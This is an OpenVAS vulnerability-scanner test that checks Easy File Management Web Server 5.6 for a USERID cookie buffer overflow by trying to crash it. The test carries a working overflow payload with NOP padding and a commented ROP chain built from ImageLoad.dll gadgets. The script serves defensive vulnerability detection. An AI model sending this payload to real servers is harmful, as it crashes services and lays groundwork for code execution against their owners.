##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_easy_file_management_web_server_bof_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# Easy File Management Web Server USERID Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805096");
  script_version("$Revision: 13659 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2015-08-24 16:20:19 +0530 (Mon, 24 Aug 2015)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Easy File Management Web Server USERID Buffer Overflow Vulnerability");

  script_tag(name:"summary", value:"The host is running Easy File Management Web
  Server and is prone to buffer overflow vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET
  and check whether it is able to crash or not.");

  script_tag(name:"insight", value:"The flaw is due to an error when processing
  web requests and can be exploited to cause a buffer overflow via an overly long
  string passed to USERID in a HEAD or GET request.");

  script_tag(name:"impact", value:"Successful exploitation may allow remote
  attackers to cause the application to crash, creating a denial-of-service
  condition.");

  script_tag(name:"affected", value:"Easy File Management Web Server version 5.6");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37808");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("efmws/banner");

  exit(0);
}


include("http_func.inc");


http_port = get_http_port(default:80);

## product is of low priority
## Detect NVT is not required.
kBanner = get_http_banner(port:http_port);
if(!kBanner || "Server: Easy File Management Web Server" >!< kBanner){
  exit(0);
}

## Cross Confirm to avoid FP
if(http_is_dead(port:http_port)){
  exit(0);
}

host = http_host_name(port:http_port);
useragent = http_get_user_agent();
UserID= crap(length:80, data:raw_string(0x90)) +
        raw_string(0xc8, 0xd8, 0x01, 0x10) +  crap(length:280,
        data:raw_string(0x90)) +
        # POP EBX # POP ECX # RETN [ImageLoad.dll]
        # Since 0x00 would break the exploit needs to be crafted on the stack
        # contains 00000000 to pass the JNZ instruction
        # MOV EAX,EBX # POP ESI # POP EBX # RETN [ImageLoad.dll]
        # ADD EAX,5BFFC883 # RETN [ImageLoad.dll] # finish crafting JMP ESP
        # PUSH EAX # RETN [ImageLoad.dll]
        raw_string(0x01, 0x01, 0x01, 0x10,
        0xfb, 0x62, 0x41, 0xa4, 0x25, 0x01, 0x01, 0x10, 0xac, 0x2a,
        0x02, 0x10, 0xef, 0xbe, 0xad, 0xde, 0xef, 0xbe, 0xad, 0xde,
        0x87, 0xa1, 0x01, 0x10, 0x6d, 0x46, 0x02, 0x10) + crap(length:20,
        data:raw_string(0x90)) +raw_string(0x3b, 0x20);

sndReq = 'GET /vfolder.ghp HTTP/1.1\r\n' +
         'Host: ' +  host + '\r\n' +
         'User-Agent: ' + useragent + '\r\n' +
         'Cookie: SESSIONID=1337; UserID=' +  UserID  +'PassWD=' + '\r\n' +
           '\r\n';

rcvRes = http_send_recv(port:http_port, data:sndReq);

if(http_is_dead(port:http_port))
{
  security_message(http_port);
  exit(0);
}
